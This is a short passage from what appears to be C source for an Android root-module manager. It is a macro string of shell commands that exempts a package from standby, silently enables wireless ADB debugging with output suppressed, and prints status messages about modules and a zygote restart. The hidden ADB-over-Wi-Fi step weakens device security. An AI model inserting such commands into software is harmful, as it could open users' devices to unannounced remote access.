  "am set-standby-bucket \"$PKG\" active >/dev/null 2>&1; " \
  "settings put global adb_wifi_enabled 1 >/dev/null 2>&1; " \
  "echo \"apply-modules: manager $PKG exempted for next boot\"; fi; " \
  "echo 'apply-modules: zygote restarted for module pickup'; exit 0"

#endif
